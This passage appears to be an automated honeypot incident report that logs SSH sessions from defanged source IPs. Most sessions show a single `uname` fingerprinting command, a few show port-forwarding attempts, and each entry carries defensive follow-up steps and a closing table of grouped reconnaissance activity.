| `2026-09-11 06:08:21` | `cowrie.client.version` |
| `2026-09-11 06:08:21` | `cowrie.client.kex` |
| `2026-09-11 06:08:30` | `cowrie.login.success` |
| `2026-09-11 06:08:36` | `cowrie.session.params` |
| `2026-09-11 06:08:36` | `cowrie.command.input` |
| `2026-09-11 06:08:37` | `cowrie.log.closed` |
| `2026-09-11 06:08:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `36.41.186[.]9` to AbuseIPDB if not already reported
- [ ] Block `36.41.186[.]9` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6de564e1bb72

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]183` |
| **First Seen** | 2026-09-11 06:08 |
| **Last Seen** | 2026-09-11 06:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-11 06:08:57` | `cowrie.session.connect` |
| `2026-09-11 06:08:57` | `cowrie.client.version` |
| `2026-09-11 06:08:57` | `cowrie.client.kex` |
| `2026-09-11 06:08:57` | `cowrie.login.success` |
| `2026-09-11 06:08:58` | `cowrie.session.params` |
| `2026-09-11 06:08:58` | `cowrie.command.input` |
| `2026-09-11 06:08:58` | `cowrie.log.closed` |
| `2026-09-11 06:08:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]183` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]183` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fadbb105f50c

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]183` |
| **First Seen** | 2026-09-11 06:11 |
| **Last Seen** | 2026-09-11 06:11 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-11 06:11:27` | `cowrie.session.connect` |
| `2026-09-11 06:11:27` | `cowrie.client.version` |
| `2026-09-11 06:11:27` | `cowrie.client.kex` |
| `2026-09-11 06:11:28` | `cowrie.login.success` |
| `2026-09-11 06:11:28` | `cowrie.session.params` |
| `2026-09-11 06:11:28` | `cowrie.command.input` |
| `2026-09-11 06:11:28` | `cowrie.log.closed` |
| `2026-09-11 06:11:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]183` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]183` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-25d2e85284b7

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]183` |
| **First Seen** | 2026-09-11 06:13 |
| **Last Seen** | 2026-09-11 06:13 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-11 06:13:56` | `cowrie.session.connect` |
| `2026-09-11 06:13:57` | `cowrie.client.version` |
| `2026-09-11 06:13:57` | `cowrie.client.kex` |
| `2026-09-11 06:13:57` | `cowrie.login.success` |
| `2026-09-11 06:13:57` | `cowrie.session.params` |
| `2026-09-11 06:13:57` | `cowrie.command.input` |
| `2026-09-11 06:13:58` | `cowrie.log.closed` |
| `2026-09-11 06:13:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]183` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]183` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-84a671415307

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]183` |
| **First Seen** | 2026-09-11 06:16 |
| **Last Seen** | 2026-09-11 06:16 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-11 06:16:29` | `cowrie.session.connect` |
| `2026-09-11 06:16:29` | `cowrie.client.version` |
| `2026-09-11 06:16:29` | `cowrie.client.kex` |
| `2026-09-11 06:16:29` | `cowrie.login.success` |
| `2026-09-11 06:16:30` | `cowrie.session.params` |
| `2026-09-11 06:16:30` | `cowrie.command.input` |
| `2026-09-11 06:16:30` | `cowrie.log.closed` |
| `2026-09-11 06:16:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]183` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]183` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ae0c1debfd7f

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]183` |
| **First Seen** | 2026-09-11 06:18 |
| **Last Seen** | 2026-09-11 06:19 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-11 06:18:59` | `cowrie.session.connect` |
| `2026-09-11 06:18:59` | `cowrie.client.version` |
| `2026-09-11 06:19:00` | `cowrie.client.kex` |
| `2026-09-11 06:19:00` | `cowrie.login.success` |
| `2026-09-11 06:19:01` | `cowrie.session.params` |
| `2026-09-11 06:19:01` | `cowrie.command.input` |
| `2026-09-11 06:19:01` | `cowrie.log.closed` |
| `2026-09-11 06:19:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]183` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]183` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0dea322e96b7

| Field | Detail |
|---|---|
| **Source IP** | `138.226.239[.]233` |
| **First Seen** | 2026-09-11 06:19 |
| **Last Seen** | 2026-09-11 06:19 |
| **Session Duration** | 18s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-11 06:19:04` | `cowrie.session.connect` |
| `2026-09-11 06:19:04` | `cowrie.client.version` |
| `2026-09-11 06:19:04` | `cowrie.client.kex` |
| `2026-09-11 06:19:04` | `cowrie.login.success` |
| `2026-09-11 06:19:07` | `cowrie.direct-tcpip.request` |
| `2026-09-11 06:19:10` | `cowrie.direct-tcpip.ja4` |
| `2026-09-11 06:19:10` | `cowrie.direct-tcpip.data` |
| `2026-09-11 06:19:14` | `cowrie.direct-tcpip.request` |
| `2026-09-11 06:19:16` | `cowrie.direct-tcpip.ja4` |
| `2026-09-11 06:19:16` | `cowrie.direct-tcpip.data` |
| `2026-09-11 06:19:20` | `cowrie.direct-tcpip.request` |
| `2026-09-11 06:19:21` | `cowrie.direct-tcpip.ja4` |
| `2026-09-11 06:19:21` | `cowrie.direct-tcpip.data` |
| `2026-09-11 06:19:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.226.239[.]233` to AbuseIPDB if not already reported
- [ ] Block `138.226.239[.]233` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6468acbc5ddf

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]183` |
| **First Seen** | 2026-09-11 06:21 |
| **Last Seen** | 2026-09-11 06:21 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-11 06:21:22` | `cowrie.session.connect` |
| `2026-09-11 06:21:22` | `cowrie.client.version` |
| `2026-09-11 06:21:22` | `cowrie.client.kex` |
| `2026-09-11 06:21:23` | `cowrie.login.success` |
| `2026-09-11 06:21:23` | `cowrie.session.params` |
| `2026-09-11 06:21:23` | `cowrie.command.input` |
| `2026-09-11 06:21:23` | `cowrie.log.closed` |
| `2026-09-11 06:21:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]183` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]183` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-90cd0a0963a1

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]183` |
| **First Seen** | 2026-09-11 06:23 |
| **Last Seen** | 2026-09-11 06:23 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-11 06:23:53` | `cowrie.session.connect` |
| `2026-09-11 06:23:53` | `cowrie.client.version` |
| `2026-09-11 06:23:53` | `cowrie.client.kex` |
| `2026-09-11 06:23:53` | `cowrie.login.success` |
| `2026-09-11 06:23:54` | `cowrie.session.params` |
| `2026-09-11 06:23:54` | `cowrie.command.input` |
| `2026-09-11 06:23:54` | `cowrie.log.closed` |
| `2026-09-11 06:23:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]183` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]183` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b3a913c9b36f

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-09-11 06:24 |
| **Last Seen** | 2026-09-11 06:24 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-11 06:24:07` | `cowrie.session.connect` |
| `2026-09-11 06:24:07` | `cowrie.client.version` |
| `2026-09-11 06:24:07` | `cowrie.client.kex` |
| `2026-09-11 06:24:07` | `cowrie.login.success` |
| `2026-09-11 06:24:08` | `cowrie.direct-tcpip.request` |
| `2026-09-11 06:24:08` | `cowrie.direct-tcpip.data` |
| `2026-09-11 06:24:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b0af7cf244c9

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]183` |
| **First Seen** | 2026-09-11 06:26 |
| **Last Seen** | 2026-09-11 06:26 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-11 06:26:17` | `cowrie.session.connect` |
| `2026-09-11 06:26:17` | `cowrie.client.version` |
| `2026-09-11 06:26:17` | `cowrie.client.kex` |
| `2026-09-11 06:26:17` | `cowrie.login.success` |
| `2026-09-11 06:26:18` | `cowrie.session.params` |
| `2026-09-11 06:26:18` | `cowrie.command.input` |
| `2026-09-11 06:26:18` | `cowrie.log.closed` |
| `2026-09-11 06:26:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]183` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]183` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-40effeb715b9

| Field | Detail |
|---|---|
| **Source IP** | `34.22.200[.]106` |
| **First Seen** | 2026-09-11 06:28 |
| **Last Seen** | 2026-09-11 06:28 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0[.]0 Safari/537.36, Accept-Encoding: gzip` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-11 06:28:24` | `cowrie.session.connect` |
| `2026-09-11 06:28:24` | `cowrie.login.success` |
| `2026-09-11 06:28:24` | `cowrie.session.params` |
| `2026-09-11 06:28:24` | `cowrie.command.input` |
| `2026-09-11 06:28:24` | `cowrie.command.input` |
| `2026-09-11 06:28:24` | `cowrie.command.failed` |
| `2026-09-11 06:28:24` | `cowrie.command.input` |
| `2026-09-11 06:28:24` | `cowrie.log.closed` |
| `2026-09-11 06:28:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.22.200[.]106` to AbuseIPDB if not already reported
- [ ] Block `34.22.200[.]106` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c62cdf3b8bd8

| Field | Detail |
|---|---|
| **Source IP** | `34.22.200[.]106` |
| **First Seen** | 2026-09-11 06:28 |
| **Last Seen** | 2026-09-11 06:28 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `PING` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-11 06:28:37` | `cowrie.session.connect` |
| `2026-09-11 06:28:37` | `cowrie.login.success` |
| `2026-09-11 06:28:38` | `cowrie.session.params` |
| `2026-09-11 06:28:38` | `cowrie.command.input` |
| `2026-09-11 06:28:38` | `cowrie.command.failed` |
| `2026-09-11 06:28:50` | `cowrie.log.closed` |
| `2026-09-11 06:28:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.22.200[.]106` to AbuseIPDB if not already reported
- [ ] Block `34.22.200[.]106` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f73c46d64414

| Field | Detail |
|---|---|
| **Source IP** | `34.22.200[.]106` |
| **First Seen** | 2026-09-11 06:28 |
| **Last Seen** | 2026-09-11 06:28 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-11 06:28:39` | `cowrie.session.connect` |
| `2026-09-11 06:28:39` | `cowrie.login.success` |
| `2026-09-11 06:28:40` | `cowrie.session.params` |
| `2026-09-11 06:28:40` | `cowrie.command.input` |
| `2026-09-11 06:28:50` | `cowrie.log.closed` |
| `2026-09-11 06:28:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.22.200[.]106` to AbuseIPDB if not already reported
- [ ] Block `34.22.200[.]106` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-57308ad390d6

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]183` |
| **First Seen** | 2026-09-11 06:28 |
| **Last Seen** | 2026-09-11 06:28 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-11 06:28:48` | `cowrie.session.connect` |
| `2026-09-11 06:28:48` | `cowrie.client.version` |
| `2026-09-11 06:28:48` | `cowrie.client.kex` |
| `2026-09-11 06:28:48` | `cowrie.login.success` |
| `2026-09-11 06:28:49` | `cowrie.session.params` |
| `2026-09-11 06:28:49` | `cowrie.command.input` |
| `2026-09-11 06:28:49` | `cowrie.log.closed` |
| `2026-09-11 06:28:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]183` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]183` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c7f01ce0c6d3

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]183` |
| **First Seen** | 2026-09-11 06:31 |
| **Last Seen** | 2026-09-11 06:31 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-11 06:31:20` | `cowrie.session.connect` |
| `2026-09-11 06:31:20` | `cowrie.client.version` |
| `2026-09-11 06:31:20` | `cowrie.client.kex` |
| `2026-09-11 06:31:20` | `cowrie.login.success` |
| `2026-09-11 06:31:21` | `cowrie.session.params` |
| `2026-09-11 06:31:21` | `cowrie.command.input` |
| `2026-09-11 06:31:21` | `cowrie.log.closed` |
| `2026-09-11 06:31:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]183` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]183` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0e8f1de2f2d1

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]183` |
| **First Seen** | 2026-09-11 06:33 |
| **Last Seen** | 2026-09-11 06:33 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-11 06:33:47` | `cowrie.session.connect` |
| `2026-09-11 06:33:47` | `cowrie.client.version` |
| `2026-09-11 06:33:47` | `cowrie.client.kex` |
| `2026-09-11 06:33:47` | `cowrie.login.success` |
| `2026-09-11 06:33:48` | `cowrie.session.params` |
| `2026-09-11 06:33:48` | `cowrie.command.input` |
| `2026-09-11 06:33:48` | `cowrie.log.closed` |
| `2026-09-11 06:33:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]183` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]183` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7213486f0693

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]183` |
| **First Seen** | 2026-09-11 06:36 |
| **Last Seen** | 2026-09-11 06:36 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-11 06:36:21` | `cowrie.session.connect` |
| `2026-09-11 06:36:21` | `cowrie.client.version` |
| `2026-09-11 06:36:21` | `cowrie.client.kex` |
| `2026-09-11 06:36:22` | `cowrie.login.success` |
| `2026-09-11 06:36:23` | `cowrie.session.params` |
| `2026-09-11 06:36:23` | `cowrie.command.input` |
| `2026-09-11 06:36:23` | `cowrie.log.closed` |
| `2026-09-11 06:36:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]183` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]183` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ee0d007a3db4

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]183` |
| **First Seen** | 2026-09-11 06:38 |
| **Last Seen** | 2026-09-11 06:38 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-11 06:38:44` | `cowrie.session.connect` |
| `2026-09-11 06:38:44` | `cowrie.client.version` |
| `2026-09-11 06:38:45` | `cowrie.client.kex` |
| `2026-09-11 06:38:45` | `cowrie.login.success` |
| `2026-09-11 06:38:46` | `cowrie.session.params` |
| `2026-09-11 06:38:46` | `cowrie.command.input` |
| `2026-09-11 06:38:46` | `cowrie.log.closed` |
| `2026-09-11 06:38:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]183` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]183` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c72d2223882e

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]183` |
| **First Seen** | 2026-09-11 06:43 |
| **Last Seen** | 2026-09-11 06:43 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-11 06:43:42` | `cowrie.session.connect` |
| `2026-09-11 06:43:42` | `cowrie.client.version` |
| `2026-09-11 06:43:42` | `cowrie.client.kex` |
| `2026-09-11 06:43:42` | `cowrie.login.success` |
| `2026-09-11 06:43:43` | `cowrie.session.params` |
| `2026-09-11 06:43:43` | `cowrie.command.input` |
| `2026-09-11 06:43:43` | `cowrie.log.closed` |
| `2026-09-11 06:43:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]183` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]183` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bfc3a088d39f

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]183` |
| **First Seen** | 2026-09-11 06:46 |
| **Last Seen** | 2026-09-11 06:46 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-11 06:46:13` | `cowrie.session.connect` |
| `2026-09-11 06:46:13` | `cowrie.client.version` |
| `2026-09-11 06:46:13` | `cowrie.client.kex` |
| `2026-09-11 06:46:14` | `cowrie.login.success` |
| `2026-09-11 06:46:14` | `cowrie.session.params` |
| `2026-09-11 06:46:14` | `cowrie.command.input` |
| `2026-09-11 06:46:14` | `cowrie.log.closed` |
| `2026-09-11 06:46:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]183` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]183` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dd3856d5e3e2

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]183` |
| **First Seen** | 2026-09-11 06:48 |
| **Last Seen** | 2026-09-11 06:48 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-11 06:48:45` | `cowrie.session.connect` |
| `2026-09-11 06:48:45` | `cowrie.client.version` |
| `2026-09-11 06:48:45` | `cowrie.client.kex` |
| `2026-09-11 06:48:45` | `cowrie.login.success` |
| `2026-09-11 06:48:46` | `cowrie.session.params` |
| `2026-09-11 06:48:46` | `cowrie.command.input` |
| `2026-09-11 06:48:46` | `cowrie.log.closed` |
| `2026-09-11 06:48:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]183` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]183` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-80cbb7b7114b

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]183` |
| **First Seen** | 2026-09-11 06:51 |
| **Last Seen** | 2026-09-11 06:51 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-11 06:51:12` | `cowrie.session.connect` |
| `2026-09-11 06:51:12` | `cowrie.client.version` |
| `2026-09-11 06:51:13` | `cowrie.client.kex` |
| `2026-09-11 06:51:13` | `cowrie.login.success` |
| `2026-09-11 06:51:14` | `cowrie.session.params` |
| `2026-09-11 06:51:14` | `cowrie.command.input` |
| `2026-09-11 06:51:14` | `cowrie.log.closed` |
| `2026-09-11 06:51:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]183` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]183` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7bd86401a797

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]183` |
| **First Seen** | 2026-09-11 06:53 |
| **Last Seen** | 2026-09-11 06:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-11 06:53:47` | `cowrie.session.connect` |
| `2026-09-11 06:53:47` | `cowrie.client.version` |
| `2026-09-11 06:53:47` | `cowrie.client.kex` |
| `2026-09-11 06:53:47` | `cowrie.login.success` |
| `2026-09-11 06:53:48` | `cowrie.session.params` |
| `2026-09-11 06:53:48` | `cowrie.command.input` |
| `2026-09-11 06:53:48` | `cowrie.log.closed` |
| `2026-09-11 06:53:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]183` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]183` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `107.150.146[.]69` | **52** | 2026-09-11 03:07 | 2026-09-11 06:54 | 30m | 0 | `T1592` | 🟠 MEDIUM |
| `207.175.13[.]248` | **29** | 2026-09-11 05:07 | 2026-09-11 05:08 | 1m | 0 | `T1592` | 🟠 MEDIUM |
| `207.175.145[.]232` | **29** | 2026-09-11 05:44 | 2026-09-11 05:45 | 2m | 0 | `T1592` | 🟠 MEDIUM |
| `34.22.200[.]106` | **29** | 2026-09-11 06:28 | 2026-09-11 06:28 | 5m | 0 | `T1592` | 🟠 MEDIUM |
| `51.158.205[.]203` | **6** | 2026-09-11 03:26 | 2026-09-11 03:30 | 0m | 0 | `T1592` | 🟢 LOW |
| `213.230.86[.]12` | **3** | 2026-09-11 04:08 | 2026-09-11 04:09 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]212` | **3** | 2026-09-11 04:37 | 2026-09-11 04:37 | 0m | 0 | `T1592` | 🟢 LOW |
| `68.206.93[.]211` | **3** | 2026-09-11 05:34 | 2026-09-11 05:42 | 0m | 0 | `T1592` | 🟢 LOW |
| `115.190.188[.]201` | **2** | 2026-09-11 06:06 | 2026-09-11 06:08 | 2m | 0 | `T1592` | 🟢 LOW |
| `170.238.230[.]88` | **2** | 2026-09-11 05:05 | 2026-09-11 05:10 | 0m | 0 | `T1592` | 🟢 LOW |
